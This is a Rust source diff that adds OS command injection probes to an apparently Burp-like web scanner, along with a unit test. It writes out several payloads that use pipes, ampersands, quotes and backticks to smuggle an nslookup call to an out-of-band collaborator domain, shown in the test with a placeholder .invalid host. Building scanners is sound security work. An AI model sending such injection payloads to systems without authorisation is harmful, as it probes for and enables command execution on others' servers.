@@ -414,8 +414,51 @@ where
     sent
 }
 
+/// OS command injection, Collaborator half (burp.Zc99.Zu): `nslookup -q=cname`
+/// payloads for the Collaborator domain, each with its own id. At normal and
+/// thorough speed the replace payload (Ze2n mode 0, replaces the value), the
+/// pipe and the ampersand payloads (mode 1, appended) run, then, as at fast
+/// speed, the combined payload (Zwyn falls through from cases 1-2 to 3).
+/// Returns (slot, payload with `%s`/`%1$s` = domain + ".", append?).
+pub(crate) fn os_cmd_payloads(speed: crate::scan::ScanSpeed, mut domain_for: impl FnMut(&str) -> Option<String>) -> Vec<(&'static str, String, bool)> {
+    const ALL: [(&str, &str, bool); 4] = [
+        ("cmd0", "nslookup -q=cname %s&", false),
+        ("cmd1", "|nslookup -q=cname %s&", true),
+        ("cmd2", "'\"`0&nslookup -q=cname %s&`'", true),
+        ("cmd3", "&nslookup -q=cname %s&'\\\"`0&nslookup -q=cname %1$s&`'", true),
+    ];
+    let from = if matches!(speed, crate::scan::ScanSpeed::Fast) { 3 } else { 0 };
+    ALL[from..]
+        .iter()
+        .filter_map(|(slot, fmt, append)| {
+            let d = format!("{}.", domain_for(slot)?);
+            Some((*slot, fmt.replace("%1$s", &d).replace("%s", &d), *append))
+        })
+        .collect()
+}
+
 #[cfg(test)]
 mod tests {
+    #[test]
+    fn os_cmd_payloads_follow_zc99() {
+        use crate::scan::ScanSpeed;
+        let d = |slot: &str| Some(format!("{slot}.oob.invalid"));
+        let normal = os_cmd_payloads(ScanSpeed::Normal, d);
+        let got: Vec<(&str, &str, bool)> = normal.iter().map(|(s, p, a)| (*s, p.as_str(), *a)).collect();
+        assert_eq!(
+            got,
+            [
+                ("cmd0", "nslookup -q=cname cmd0.oob.invalid.&", false),
+                ("cmd1", "|nslookup -q=cname cmd1.oob.invalid.&", true),
+                ("cmd2", "'\"`0&nslookup -q=cname cmd2.oob.invalid.&`'", true),
+                ("cmd3", "&nslookup -q=cname cmd3.oob.invalid.&'\\\"`0&nslookup -q=cname cmd3.oob.invalid.&`'", true),
+            ]
+        );
+        let fast = os_cmd_payloads(ScanSpeed::Fast, d);
+        assert_eq!(fast.iter().map(|f| f.0).collect::<Vec<_>>(), ["cmd3"]);
+        assert!(os_cmd_payloads(ScanSpeed::Thorough, |_| None).is_empty(), "no Collaborator, no probe");
+    }
+
     use super::*;
     use std::cell::RefCell;
 
